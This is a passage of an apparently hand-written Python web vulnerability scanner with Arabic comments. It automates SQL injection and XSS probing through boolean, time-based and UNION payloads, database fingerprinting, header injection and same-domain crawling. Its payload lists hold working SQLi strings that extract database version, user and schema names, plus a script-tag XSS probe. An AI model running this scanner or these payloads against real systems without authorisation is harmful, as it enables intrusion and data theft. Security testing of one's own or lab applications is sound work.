        statuses = []
        for _ in range(self.retries):
            r = request_with_timeout(method, url, headers=headers)
            if not r:
                continue
            body = normalize_response(r.text or "")
            lengths.append(len(body))
            bodies.append(body)
            statuses.append(r.status_code)
        if not lengths:
            return None, None, None
        avg_len = sum(lengths) / len(lengths)
        return avg_len, bodies[-1], statuses[-1]

    def _looks_numeric(self, value):
        try:
            float(value)
            return True
        except (TypeError, ValueError):
            return False

    def _build_injected_value(self, original_value, which):
        """
        which: "true" -> AND 1=1
               "false" -> AND 1=2
        """
        if original_value is None:
            original_value = ""
        if self._looks_numeric(original_value):
            if which == "true":
                return f"{original_value} AND 1=1"
            else:
                return f"{original_value} AND 1=2"
        else:
            if which == "true":
                return f"{original_value}' AND '1'='1"
            else:
                return f"{original_value}' AND '1'='2"

    def _similar(self, a, b):
        if a is None or b is None:
            return 0.0
        return difflib.SequenceMatcher(None, a, b).ratio()

    def _significant_length_diff(self, len_a, len_b):
        if len_a is None or len_b is None:
            return False
        bigger = max(len_a, len_b)
        smaller = min(len_a, len_b)
        if bigger == 0:
            return False
        diff_ratio = (bigger - smaller) / bigger
        return diff_ratio >= self.length_diff_ratio

    def run_for_url(self, method, url, headers=None, fingerprint=None):
        """
        Runs Phase 1 on a single URL (GET query params only).
        Returns list of findings compatible مع بقية التقرير.
        """
        method = method.upper()
        if method != "GET":
            return []

        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return []

        base_len, base_body, base_status = self._send_retriable(method, url, headers=headers)
        if base_body is None:
            return []

        findings = []

        for param_name, values in params.items():
            original_value = values[0] if values else ""

            # build true URL
            true_params = deepcopy(params)
            true_params[param_name] = [self._build_injected_value(original_value, "true")]
            true_qs = urlencode({k: v[0] for k, v in true_params.items()}, doseq=False)
            true_url = urlunparse(parsed._replace(query=true_qs))

            # build false URL
            false_params = deepcopy(params)
            false_params[param_name] = [self._build_injected_value(original_value, "false")]
            false_qs = urlencode({k: v[0] for k, v in false_params.items()}, doseq=False)
            false_url = urlunparse(parsed._replace(query=false_qs))

            true_len, true_body, true_status = self._send_retriable(method, true_url, headers=headers)
            false_len, false_body, false_status = self._send_retriable(method, false_url, headers=headers)

            if true_body is None or false_body is None:
                continue

            sim_base_true = self._similar(base_body, true_body)
            sim_base_false = self._similar(base_body, false_body)
            sim_true_false = self._similar(true_body, false_body)

            is_true_like_base = (sim_base_true >= self.similarity_threshold and
                                 not self._significant_length_diff(base_len, true_len))

            is_false_differs = (
                sim_base_false < self.similarity_threshold or
                self._significant_length_diff(base_len, false_len) or
                sim_true_false < self.similarity_threshold or
                self._significant_length_diff(true_len, false_len)
            )

            if is_true_like_base and is_false_differs:
                score = 40  # درجة متوسطة، لأنه Phase 1 heuristic
                finding = {
                    "timestamp": now_ts(),
                    "url": url,
                    "test_url": false_url,
                    "method": method,
                    "injected_param": param_name,
                    "payload": "[BOOLEAN_PROBE: AND 1=1 / AND 1=2]",
                    "vuln_type": "Potential Blind SQLi",
                    "reason": (
                        "Boolean-based difference: baseline≈true (AND 1=1) but baseline/false (AND 1=2) responses differ. "
                        f"sim_base_true={sim_base_true:.3f}, sim_base_false={sim_base_false:.3f}, sim_true_false={sim_true_false:.3f}"
                    ),
                    "status_code": false_status,
                    "auto_verified": False,
                    "verify": {
                        "verified": False,
                        "evidence": "Phase 1 boolean heuristic only",
                        "score_delta": 0,
                        "elapsed": 0.0
                    },
                    "fingerprint": fingerprint or {},
                    "score": score,
                    "status": "probable",
                    "base_len": int(base_len or 0),
                    "resp_len": int(false_len or 0)
                }
                log(f"[BLIND] Potential Blind SQLi on {url} param '{param_name}' (score={score})")
                findings.append(finding)

        return findings

# --- Phase 4: Fingerprinting & Payload tuning ---
FINGERPRINT_RULES = {
    "server": {
        "nginx": [r"\bnginx\b", r"openresty"],
        "apache": [r"\bapache\b"],
        "iis": [r"\biis\b", r"microsoft-iis"]
    },
    "language": {
        "php": [r"\bphp\b", r"x-powered-by:\s*php"],
        "asp.net": [r"\basp\.net\b", r"aspnet"],
        "node": [r"\bnode\.js\b", r"x-powered-by:\s*express"],
        "jsp": [r"\bjsp\b", r"servlet"]
    },
    "database": {
        "mysql": [r"\bmysql\b"],
        "mariadb": [r"\bmariadb\b"],
        "postgresql": [r"\bpostgresql\b", r"\bpg\b"],
        "mssql": [r"\bmicrosoft sql server\b", r"\bmssql\b"],
        "sqlite": [r"\bsqlite\b"],
        "oracle": [r"\boracle\b", r"\bora-\d{5}\b"]
    }
}

def fingerprint_response(resp_text, resp_headers):
    """
    Phase 4 – Fingerprinting:
    - يعتمد على FINGERPRINT_RULES (header + body)
    - بالإضافة لتحليل رسائل الأخطاء DB_ERROR_SIGNATURES
      عشان نميّز بين MySQL / MariaDB / MSSQL / PostgreSQL / Oracle
    """
    text = (resp_text or "").lower()
    headers_join = " ".join([f"{k}:{v}" for k, v in (resp_headers or {}).items()]).lower()

    found = {
        "server": None,
        "language": None,
        "database": None,
        "evidence": []
    }

    # 1) قواعد عامة (سيرفر / لغة / DB من الهيدرز أو أي نص واضح)
    for category, rules in FINGERPRINT_RULES.items():
        for label, patterns in rules.items():
            for p in patterns:
                try:
                    if re.search(p, headers_join) or re.search(p, text):
                        if not found[category]:
                            found[category] = label
                        found["evidence"].append(f"{category}:{label} matched /{p}/")
                        break
                except re.error:
                    continue
            if found[category]:
                break

    # 2) تحليل رسائل الأخطاء الخاصة بكل DBMS
    db_scores = {}
    for dbms, patterns in DB_ERROR_SIGNATURES.items():
        for p in patterns:
            try:
                if re.search(p, text):
                    db_scores[dbms] = db_scores.get(dbms, 0) + 2  # errors = قوية
            except re.error:
                continue

    if db_scores:
        best_db = max(db_scores, key=db_scores.get)
        # لو ما في database من قبل → استخدم اللي من الأخطاء
        if not found["database"]:
            found["database"] = best_db
            found["evidence"].append(f"database:{best_db} matched DB_ERROR_SIGNATURES (score={db_scores[best_db]})")
        else:
            # لو في value موجود لكن الـ error signatures أقوى/أوضح → نقدر نحدّث
            if found["database"] != best_db and db_scores[best_db] >= 2:
                found["evidence"].append(
                    f"database overridden from {found['database']} to {best_db} by DB_ERROR_SIGNATURES (score={db_scores[best_db]})"
                )
                found["database"] = best_db

    return found

PAYLOAD_SETS = {
    "default": SQL_PAYLOADS + XSS_PAYLOADS,

    # MySQL / MariaDB
    "mysql": [
        "' OR SLEEP(2)-- ",
        "' UNION SELECT @@version-- ",
        "' UNION SELECT database()-- ",
        "' UNION SELECT user()-- "
    ],

    # MariaDB = تقريباً MySQL لكن مع واحدة schema_name
    "mariadb": [
        "' OR SLEEP(2)-- ",
        "' UNION SELECT @@version-- ",
        "' UNION SELECT schema_name FROM information_schema.schemata LIMIT 1-- "
    ],

    # PostgreSQL
    "postgresql": [
        "'; SELECT pg_sleep(2); --",
        "\"; SELECT pg_sleep(2); --",
        "' OR (SELECT version()) --",
        "\"; SELECT version(); --"
    ],

    # MSSQL
    "mssql": [
        "' AND 1=CONVERT(INT,@@version)--",
        "\"; WAITFOR DELAY '00:00:02'--"
    ],

    # Oracle (basic)
    "oracle": [
        "' UNION SELECT banner FROM v$version--",
        "' AND 1=(SELECT COUNT(*) FROM all_users)--"
    ]
}

def load_payloads_json(path: str):
    """(5) تحميل payloads مُصنَّفة من JSON: مفاتيح مثل boolean,time,error,xss"""
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
        # توقع dict فيه قوائم
        cat = {}
        for k, v in data.items():
            if isinstance(v, list):
                cat[k.lower()] = [str(x) for x in v if str(x).strip()]
        return cat
    except Exception as e:
        log(f"[ERROR] Could not read payloads JSON {path}: {e}")
        return None

def choose_payloads_from_categories(fingerprint, cats: dict):
    """
    (5) ترتيب ذكي: لِـ Postgres -> time ثم boolean ثم error ثم xss
    وإلا: boolean -> error -> time -> xss
    """
    order_pg = ["time", "boolean", "error", "xss"]
    order_def = ["boolean", "error", "time", "xss"]
    if not cats:
        return []
    db = (fingerprint or {}).get("database")
    order = order_pg if db == "postgresql" else order_def
    out = []
    for k in order:
        out.extend(cats.get(k, []))
    # إزالة التكرارات مع الحفاظ على الترتيب
    seen = set(); uniq = []
    for p in out:
        if p not in seen:
            uniq.append(p); seen.add(p)
    return uniq

def choose_payloads(fingerprint):
    """
    Phase 4 – Adaptive payload selection:
    - لو عرفنا نوع الـ DB من fingerprint:
        * نستخدم payloads الخاصة فيها أولاً
        * بعدين نكمّل بالـ default بدون تكرار
    - لو ما عرفنا:
        * fallback على ASP.NET → MSSQL
        * وإلا default.
    """
    base = PAYLOAD_SETS["default"]

    if not fingerprint:
        return base

    db = (fingerprint or {}).get("database")
    db = (db or "").lower()

    # Treat MariaDB كـ MySQL لو ما فيه set خاص (بس إحنا ضفنا واحدة له)
    if db == "mariadb" and "mariadb" not in PAYLOAD_SETS:
        db = "mysql"

    # DB-specific payloads
    if db in PAYLOAD_SETS and db not in ("default",):
        db_set = PAYLOAD_SETS[db]
        merged = db_set + [p for p in base if p not in db_set]
        return merged

    # ASP.NET → نرجّح MSSQL
    lang = (fingerprint or {}).get("language")
    if lang == "asp.net":
        mssql_set = PAYLOAD_SETS.get("mssql", [])
        merged = mssql_set + [p for p in base if p not in mssql_set]
        return merged

    # fallback
    return base

def compute_score(base_confidence=10, fingerprint=None, verify_result=None, payload=None):
    score = base_confidence
    if fingerprint and fingerprint.get("database"): score += 10
    if fingerprint and fingerprint.get("language"): score += 5
    if verify_result: score += verify_result.get("score_delta", 0)
    if payload and ("sleep" in payload.lower() or "waitfor" in payload.lower()): score += 5
    return max(0, min(100, score))

def _time_based_attempt(call_fn, attempts=3):
    """(2) نفّذ N محاولات وقِس المتوسط (للتحقق الزمني)"""
    delays = []
    ok_resp = None
    for _ in range(max(1, attempts)):
        t0 = time.time()
        r = call_fn()
        dt = time.time() - t0
        delays.append(dt)
        ok_resp = r
    avg = sum(delays) / len(delays)
    return ok_resp, avg

def verify_vuln(method, url, param_name, original_params, post_data, headers,
                json_body=None, json_key=None, base_text="", detected_type=None, fingerprint=None):
    # (2) time-based for Postgres مع retries ومتوسط زمن
    try:
        db = (fingerprint or {}).get("database")
        if detected_type == "SQLi" and db == "postgresql":
            tb_payload = "'; SELECT pg_sleep(2); --"
            parsed = urlparse(url)
            if json_body is not None and json_key is not None:
                def _call():
                    jb = deepcopy(json_body); jb[json_key] = tb_payload
                    return request_with_timeout(method, url, headers=headers, json_body=jb)
                r, avg = _time_based_attempt(_call, attempts=3)
            else:
                def _call():
                    p = deepcopy(original_params) if original_params else {}
                    key = param_name if param_name is not None else "_scantest"
                    p[key] = [tb_payload]
                    q = urlencode({k: v[0] for k, v in p.items()}, doseq=False)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q, parsed.fragment))
                    return request_with_timeout(method, test_url, headers=headers)
                r, avg = _time_based_attempt(_call, attempts=3)
            if r and avg > 1.5:
                return {"verified": True, "evidence": f"time-based avg delay {avg:.2f}s", "score_delta": 45, "elapsed": avg}
    except Exception:
        pass

    # fallback boolean verify
    if detected_type == "SQLi":
        ok = auto_verify_sqli(method, url, param_name, original_params, post_data, headers,
                              json_body=json_body, json_key=json_key, base_text=base_text)
        return {"verified": bool(ok), "evidence": "auto_verify_sqli "+("succeeded" if ok else "failed"),
                "score_delta": 40 if ok else 0, "elapsed": 0.0}
    if detected_type == "XSS":
        ok = auto_verify_xss(method, url, param_name, original_params, post_data, headers,
                             json_body=json_body, json_key=json_key)
        return {"verified": bool(ok), "evidence": "auto_verify_xss "+("succeeded" if ok else "failed"),
                "score_delta": 30 if ok else 0, "elapsed": 0.0}
    return {"verified": False, "evidence": "no specific verify", "score_delta": 0, "elapsed": 0.0}

# --- Auto-verification helpers (existing) ---
def auto_verify_sqli(method, url, param_name, original_params, post_data, headers,
                     json_body=None, json_key=None, base_text=""):
    true_p = "1' OR '1'='1"
    false_p = "1' AND '1'='2"
    if json_body is not None and json_key is not None:
        jb_true = deepcopy(json_body); jb_true[json_key] = true_p
        jb_false = deepcopy(json_body); jb_false[json_key] = false_p
        r_true  = request_with_timeout(method, url, headers=headers, json_body=jb_true)
        r_false = request_with_timeout(method, url, headers=headers, json_body=jb_false)
    else:
        parsed = urlparse(url)
        p_true  = deepcopy(original_params) if original_params else {}
        p_false = deepcopy(original_params) if original_params else {}
        key = param_name if param_name is not None else "_scantest"
        p_true[key]  = [true_p]
        p_false[key] = [false_p]
        q_true  = urlencode({k: v[0] for k, v in p_true.items()}, doseq=False)
        q_false = urlencode({k: v[0] for k, v in p_false.items()}, doseq=False)
        url_true  = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q_true,  parsed.fragment))
        url_false = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q_false, parsed.fragment))
        if method.upper() == "POST" and post_data and param_name and (param_name in post_data):
            pd_t = deepcopy(post_data); pd_t[param_name] = true_p
            pd_f = deepcopy(post_data); pd_f[param_name] = false_p
            r_true  = request_with_timeout("POST", url, data=pd_t, headers=headers)
            r_false = request_with_timeout("POST", url, data=pd_f, headers=headers)
        else:
            r_true  = request_with_timeout("GET" if method.upper()=="GET" else "POST", url_true,  data=post_data, headers=headers)
            r_false = request_with_timeout("GET" if method.upper()=="GET" else "POST", url_false, data=post_data, headers=headers)

    if not r_true or not r_false:
        return False
    # (4) مقارنة على نص منقّى لتقليل الضجيج
    bt = normalize_response(base_text or "")
    t_true = normalize_response(r_true.text or "")
    t_false = normalize_response(r_false.text or "")
    len_diff = abs(len(t_true) - len(t_false))
    if len_diff > max(30, int(len(bt) * 0.03)) or (t_true != t_false) or (r_true.status_code != r_false.status_code):
        return True
    return False

def auto_verify_xss(method, url, param_name, original_params, post_data, headers, json_body=None, json_key=None):
    token = f"INJ_TOKEN_{int(time.time())}"
    payload = f"<script>console.log('{token}')</script>"
    if json_body is not None and json_key is not None:
        jb = deepcopy(json_body); jb[json_key] = payload
        r = request_with_timeout(method, url, headers=headers, json_body=jb)
    else:
        parsed = urlparse(url)
        params_copy = deepcopy(original_params) if original_params else {}
        key = param_name if param_name is not None else "_scantest"
        params_copy[key] = [payload]
        q = urlencode({k: v[0] for k, v in params_copy.items()}, doseq=False)
        new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q, parsed.fragment))
        if method.upper() == "POST" and post_data and param_name and (param_name in post_data):
            pd = deepcopy(post_data); pd[param_name] = payload
            r = request_with_timeout("POST", url, data=pd, headers=headers)
        else:
            r = request_with_timeout("GET" if method.upper()=="GET" else "POST", new_url, data=post_data, headers=headers)
    if not r:
        return False
    text = r.text or ""
    return (payload in text) or (token in text)

# --- Header variants helper (for headers-inject) ---
def generate_header_variants(base_headers, payloads):
    variants = []
    header_fields = ['User-Agent', 'Referer', 'X-Forwarded-For']
    if not base_headers:
        base_headers = {}
    for h in header_fields:
        tries = 0  # (3) حد أقصى
        for pl in payloads:
            if tries >= MAX_HEADER_TRIES:
                break
            hcopy = deepcopy(base_headers)
            hcopy[h] = pl
            variants.append(hcopy)
            tries += 1
    return variants

# --- Core testing logic (single injection attempt) ---
def _single_injection_attempt(method, url, param_name, original_params, base_text, base_status,
                              payload, post_data=None, headers=None, json_body=None, json_key=None, verbose=False, fingerprint=None):
    # Build request
    if json_body is not None and json_key is not None:
        jb = deepcopy(json_body)
        jb[json_key] = payload
        r = request_with_timeout(method, url, headers=headers, json_body=jb)
        test_url = url
    else:
        params_copy = deepcopy(original_params) if original_params else {}
        params_copy[param_name] = [payload]  # parse_qs style
        parsed = urlparse(url)
        query = urlencode({k: v[0] for k, v in params_copy.items()}, doseq=False)
        new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))
        if method.upper() == "POST":
            if post_data and param_name in (post_data.keys()):
                pd = deepcopy(post_data); pd[param_name] = payload
                r = request_with_timeout("POST", url, data=pd, headers=headers)
                test_url = url
            else:
                r = request_with_timeout("POST", new_url, data=post_data, headers=headers)
                test_url = new_url
        else:
            r = request_with_timeout("GET", new_url, headers=headers)
            test_url = new_url

    if r is None:
        if verbose:
            log(f"[DEBUG] Request failed for payload on {url}: param={json_key if json_key else param_name}")
        return None

    text = r.text or ""
    status = r.status_code
    sqlerr = is_sql_error(text)
    reflected = (payload in text)
    # (4) استخدم النص المُنقّى لقياس الفرق
    len_ratio = length_change_ratio(normalize_response(base_text), normalize_response(text))

    vuln_type = None
    reason = []
    if sqlerr:
        vuln_type = "SQLi"; reason.append("SQL error pattern")
    # نعتبرها XSS لو الـ payload واحد من XSS_PAYLOADS وانعكس
    if reflected and any(payload == x for x in XSS_PAYLOADS):
        vuln_type = "XSS"; reason.append("payload reflected")
    if len_ratio > LENGTH_DIFF_THRESHOLD and status == base_status and not vuln_type:
        vuln_type = "Possible Injection"; reason.append(f"response length changed by {len_ratio*100:.1f}%")

    finding = None
    if vuln_type:
        verify_result = {"verified": False, "evidence": "", "score_delta": 0}
        if AUTO_VERIFY:
            try:
                verify_result = verify_vuln(method, url, param_name, original_params, post_data, headers,
                                            json_body=json_body, json_key=json_key, base_text=base_text,
                                            detected_type=vuln_type, fingerprint=fingerprint)
            except Exception:
                verify_result = {"verified": False, "evidence": "verify exception", "score_delta": 0}

        score = compute_score(base_confidence=10, fingerprint=fingerprint, verify_result=verify_result, payload=payload)
        status_label = "confirmed" if verify_result.get("verified") and score >= 50 else ("probable" if score >= 30 else "low")

        finding = {
            "timestamp": now_ts(),
            "url": url,
            "test_url": test_url,
            "method": method.upper(),
            "injected_param": json_key if json_key else param_name,
            "payload": payload,
            "vuln_type": vuln_type,
            "reason": "; ".join(reason),
            "status_code": status,
            "auto_verified": bool(verify_result.get("verified")),
            "verify": verify_result,
            "fingerprint": fingerprint or {},
            "score": score,
            "status": status_label,
            "base_len": len(base_text or ""),
            "resp_len": len(text or "")
        }
        msg = f"[VULN] {vuln_type} on {url} param/key '{finding['injected_param']}' payload: {payload} -- {finding['reason']} (score={score})"
        if finding["auto_verified"]:
            msg += " [AUTO-VERIFIED]"
        log(msg)
    return finding

def test_inject_all_params(method, url, params, payloads, base_text, base_status, post_data=None, headers=None, verbose=False, fingerprint=None):
    findings = []
    parsed = urlparse(url)
    for payload in payloads:
        params_all = {k: [payload] for k in params.keys()}
        query = urlencode({k: v[0] for k, v in params_all.items()}, doseq=False)
        new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))
        r = request_with_timeout("GET" if method.upper()=="GET" else "POST", new_url, data=post_data, headers=headers)
        if r is None:
            if verbose:
                log(f"[DEBUG] All-params request failed for payload: {payload}")
            continue
        text = r.text or ""
        status = r.status_code
        sqlerr = is_sql_error(text)
        reflected = any(pl in text for pl in payloads)
        len_ratio = length_change_ratio(normalize_response(base_text), normalize_response(text))
        if sqlerr or (reflected and any(pl in XSS_PAYLOADS for pl in payloads)) or (len_ratio > LENGTH_DIFF_THRESHOLD and status == base_status):
            vuln_type = "SQLi" if sqlerr else "Possible Multi-Param Injection"
            verify_result = {"verified": False, "evidence": "", "score_delta": 0}
            if AUTO_VERIFY:
                try:
                    verify_result = verify_vuln(method, url, None, params, post_data, headers, base_text=base_text,
                                                detected_type=vuln_type, fingerprint=fingerprint)
                except Exception:
                    verify_result = {"verified": False, "evidence": "verify exception", "score_delta": 0}

            score = compute_score(base_confidence=10, fingerprint=fingerprint, verify_result=verify_result, payload=payload)
            findings.append({
                "timestamp": now_ts(),
                "url": url,
                "test_url": new_url,
                "method": method.upper(),
                "injected_param": ",".join(params.keys()),
                "payload": payload,
                "vuln_type": vuln_type,
                "reason": f"all params set to payload; sqlerr={sqlerr}; len_change={len_ratio:.2f}",
                "status_code": status,
                "auto_verified": bool(verify_result.get("verified")),
                "verify": verify_result,
                "fingerprint": fingerprint or {},
                "score": score,
                "status": "confirmed" if verify_result.get("verified") and score >= 50 else ("probable" if score >= 30 else "low"),
            })
            log(f"[VULN] Multi-param {vuln_type} on {url} payload: {payload} -- len_change={len_ratio:.2f} (score={score})")
    return findings

# --- High level scanning for a single target (Phase 3 concurrency inside) ---
def scan_target(url, method="GET", postdata_str=None, headers=None, json_str=None,
                headers_inject=False, inject_all_params_flag=False, combined_payloads=None,
                verbose=False, threads=1, payloads_categories=None,
                time_sqli=False, time_delay=5, time_threshold=4.0, time_samples=3,
                union_extract=False, xss_context=False, active_fp=False,
                xss_advanced=False):
    log(f"--- Scanning: {url} (method={method}) ---")

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    post_data = None
    if postdata_str:
        post_data = {}
        for kv in postdata_str.split("&"):
            if "=" in kv:
                k, v = kv.split("=", 1)
                post_data[k] = v

    json_body = None
    if json_str:
        try:
            json_body = json.loads(json_str)
        except Exception as e:
            log(f"[ERROR] bad --json for {url}: {e}")

    base_status, base_text_raw, base_headers = baseline_response(method, url, headers=headers, json_body=json_body, data=post_data)
    if base_status is None:
        log(f"[ERROR] Baseline request failed: {url}")
        return []
    base_text = normalize_response(base_text_raw)  # (4) استخدم المنقّى كأساس

    # Phase 4: fingerprint & tuned payloads
    fingerprint = fingerprint_response(base_text_raw, base_headers)
    if verbose:
        log(f"[INFO] Fingerprint for {url}: {fingerprint}")

    # --- NEW: Active DB fingerprinting phase ---
    try:
        if active_fp and params:
            db_guess, ev = active_db_fingerprint(method, url, params, headers=headers, verbose=verbose)
            if db_guess:
                old_db = fingerprint.get("database")
                fingerprint["database"] = db_guess
                fingerprint.setdefault("evidence", []).extend(ev)
                if verbose:
                    log(f"[ACTIVE-FP] database updated from {old_db} to {db_guess}")
    except Exception as e:
        if verbose:
            log(f"[DEBUG] Active fingerprinting error on {url}: {e}")

    if combined_payloads:
        payloads = combined_payloads
    elif payloads_categories:
        payloads = choose_payloads_from_categories(fingerprint, payloads_categories)
        if verbose:
            log(f"[*] Using categorized payloads ({len(payloads)})")
    else:
        payloads = choose_payloads(fingerprint)

    # Findings list
    findings_total = []

    # --- Phase 1: Blind Boolean-based SQLi (per-parameter, GET query only) ---
    try:
        if method.upper() == "GET" and params:
            blind_phase = BlindBooleanSQLiPhase(retries=3, length_diff_ratio=0.15, similarity_threshold=0.97)
            blind_findings = blind_phase.run_for_url(method, url, headers=headers, fingerprint=fingerprint)
            if blind_findings:
                findings_total.extend(blind_findings)
    except Exception as e:
        if verbose:
            log(f"[DEBUG] Blind SQLi phase error on {url}: {e}")

    # --- Phase 2: Time-based SQLi (query params فقط حالياً) ---
    try:
        if time_sqli and params:
            tb_findings = run_time_based_sqli_phase(
                method, url, params, headers, json_body, post_data,
                fingerprint,
                time_delay=time_delay,
                time_threshold=time_threshold,
                time_samples=time_samples,
                verbose=verbose
            )
            if tb_findings:
                findings_total.extend(tb_findings)
    except Exception as e:
        if verbose:
            log(f"[DEBUG] Time-based SQLi phase error on {url}: {e}")

    # --- Phase 3b: UNION-based SQLi extraction (DB version/user/database) ---
    try:
        if union_extract and params:
            union_findings = run_union_extraction_phase(
                method, url, params, headers, json_body, post_data,
                fingerprint,
                base_status=base_status,
                base_text_raw=base_text_raw,
                verbose=verbose
            )
            if union_findings:
                findings_total.extend(union_findings)
    except Exception as e:
        if verbose:
            log(f"[DEBUG] UNION-based SQLi phase error on {url}: {e}")

    # --- Phase 8: Context-Aware XSS Detection ---
    try:
        if xss_context and params:
            ctx_findings = run_context_aware_xss_phase(
                method, url, params, headers,
                json_body=json_body,
                post_data=post_data,
                base_status=base_status,
                base_text=base_text,
                verbose=verbose,
                fingerprint=fingerprint
            )
            if ctx_findings:
                findings_total.extend(ctx_findings)
    except Exception as e:
        if verbose:
            log(f"[DEBUG] Context-aware XSS phase error on {url}: {e}")

    # --- Phase 9: Advanced Reflected XSS (smart reflection + location) ---
    try:
        if xss_advanced and params:
            adv_xss_findings = run_advanced_reflected_xss_phase(
                method, url, params, headers,
                base_text_raw=base_text_raw,
                fingerprint=fingerprint,
                verbose=verbose
            )
            if adv_xss_findings:
                findings_total.extend(adv_xss_findings)
    except Exception as e:
        if verbose:
            log(f"[DEBUG] Advanced reflected XSS phase error on {url}: {e}")

    tasks = []

    # Build header variants list
    header_variants = [headers] if headers is not None else [None]
    if headers_inject:
        header_variants = generate_header_variants(headers, payloads)

    # Build tasks (each task = one payload injection attempt)
    def add_param_payload_tasks(hdr, p_name, orig_params, jb=None, jkey=None):
        for pl in payloads:
            tasks.append( ("param", dict(
                method=method, url=url, param_name=p_name, original_params=orig_params,
                base_text=base_text, base_status=base_status, payload=pl,
                post_data=post_data, headers=hdr, json_body=jb, json_key=jkey, verbose=verbose, fingerprint=fingerprint
            )) )

    for hdr in header_variants:
        if json_body:
            for key in list(json_body.keys()):
                add_param_payload_tasks(hdr, None, {}, jb=json_body, jkey=key)
        else:
            if params:
                for pname in params.keys():
                    add_param_payload_tasks(hdr, pname, params)
                if inject_all_params_flag:
                    tasks.append( ("allparams", dict(
                        method=method, url=url, params=params, payloads=payloads,
                        base_text=base_text, base_status=base_status, post_data=post_data, headers=hdr, verbose=verbose, fingerprint=fingerprint
                    )) )
            else:
                test_param = "_scantest"
                add_param_payload_tasks(hdr, test_param, {test_param: ["1"]})

    # Execute tasks concurrently (Phase 3)
    max_workers = max(1, int(threads or 1))
    if max_workers == 1:
        for kind, kwargs in tasks:
            if kind == "param":
                f = _single_injection_attempt(**kwargs)
                if f: findings_total.append(f)
            else:
                findings_total.extend(test_inject_all_params(**kwargs))
    else:
        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            futures = []
            for kind, kwargs in tasks:
                if kind == "param":
                    futures.append( ex.submit(_single_injection_attempt, **kwargs) )
                else:
                    futures.append( ex.submit(test_inject_all_params, **kwargs) )
            for fut in as_completed(futures):
                try:
                    res = fut.result()
                    if isinstance(res, list):
                        findings_total.extend(res)
                    elif res:
                        findings_total.append(res)
                except Exception as e:
                    if verbose:
                        log(f"[DEBUG] task error: {e}")

    if not findings_total:
        log(f"[OK] No issues detected (basic heuristics) for: {url}")
    return findings_total

# --- Simple file-based targets (optional) ---
def load_targets_from_file(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return [l.strip() for l in f if l.strip()]
    except Exception as e:
        print("Error reading file:", e)
        return []

def load_payloads_file(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            lines = [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]
        return lines
    except Exception as e:
        log(f"[ERROR] Could not read payloads file {path}: {e}")
        return []

# --- New: Crawling helpers ---

JS_ENDPOINT_RE = re.compile(r'["\'](/rest/[a-zA-Z0-9_/\-?=&]+)["\']')

def is_same_domain(base_url, target_url):
    try:
        base_netloc = urlparse(base_url).netloc
        target_netloc = urlparse(target_url).netloc
        return base_netloc == target_netloc or target_netloc == ""
    except Exception:
        return False

def discover_endpoints_from_js(base_url, soup, headers=None):
    """
    يحاول قراءة ملفات الــ JS واستخراج أي مسارات REST مثل /rest/...
    هذا يساعد كثيراً مع تطبيقات SPA مثل OWASP Juice Shop.
    """
    endpoints = []

    for script in soup.find_all("script", src=True):
        src = script.get("src")
        if not src:
            continue
        js_url = urljoin(base_url, src)
        try:
            resp = requests.get(js_url, headers=headers, timeout=TIMEOUT, verify=False, allow_redirects=True)
        except Exception:
            continue
        if not resp or resp.status_code != 200:
            continue

        text = resp.text or ""
        for m in JS_ENDPOINT_RE.finditer(text):
            path = m.group(1)
            full = urljoin(base_url, path)
            endpoints.append(full)

    # إزالة التكرارات مع الحفاظ على الترتيب
    seen = set()
    uniq = []
    for u in endpoints:
        if u not in seen:
            uniq.append(u)
            seen.add(u)
    return uniq

import random

def add_dummy_param(url):
    parsed = urlparse(url)
    q = parse_qs(parsed.query)

    # لا تضف مرة أخرى لو موجود
    for k in q.keys():
        if k.startswith("_scnp_"):
            return url

    # باراميتر صغير (رقمين)
    rnd = random.randint(10, 99)
    dummy_key = f"_scnp_{rnd}"
    dummy_val = "1"

    q[dummy_key] = [dummy_val]

    new_q = urlencode({k: v[0] for k, v in q.items()}, doseq=False)
    return urlunparse(parsed._replace(query=new_q))




def crawl_site(base_url, max_depth=2, max_pages=100, headers=None):
    visited = set()
    discovered = []

    queue = deque()
    queue.append((add_dummy_param(base_url), 0))

    log(f"[*] Crawling start: {base_url} (depth={max_depth}, max_pages={max_pages})")

    while queue and len(discovered) < max_pages:
        url, depth = queue.popleft()

        url = add_dummy_param(url)

        if url in visited:
            continue
        visited.add(url)

        if depth > max_depth:
            continue

        try:
            resp = requests.get(url, headers=headers, timeout=TIMEOUT, verify=False, allow_redirects=True)
        except Exception:
            continue

        content_type = resp.headers.get("Content-Type", "")
        discovered.append(url)

        if "text/html" not in content_type.lower():
            continue

        if len(discovered) >= max_pages:
            break

        try:
            soup = BeautifulSoup(resp.text, "html.parser")
        except Exception:
            continue

        # الروابط
        for a in soup.find_all("a", href=True):
            href = a.get("href")
            if not href:
                continue
            full_url = add_dummy_param(urljoin(url, href))
            if is_same_domain(base_url, full_url) and full_url not in visited:
                queue.append((full_url, depth + 1))

        # الفورمز GET
        for form in soup.find_all("form"):
            action = form.get("action") or url
            method = (form.get("method") or "GET").upper()
            form_url = urljoin(url, action)

            params = {}
            for inp in form.find_all("input"):
                name = inp.get("name")
                if name:
                    params[name] = "1"

            if method == "GET":
                if params:
                    q = urlencode(params)
                    if "?" in form_url:
                        full_url = form_url + "&" + q
                    else:
                        full_url = form_url + "?" + q
                else:
                    full_url = form_url

                full_url = add_dummy_param(full_url)

                if is_same_domain(base_url, full_url) and full_url not in visited:
                    queue.append((full_url, depth + 1))

        # REST endpoints من ملفات JS
        js_eps = discover_endpoints_from_js(base_url, soup, headers=headers)
        for ep in js_eps:
            ep = add_dummy_param(ep)
            if is_same_domain(base_url, ep) and ep not in visited:
                queue.append((ep, depth + 1))

    # إزالة التكرار
    unique = []
    seen = set()
    for u in discovered:
        if u not in seen:
            unique.append(u)
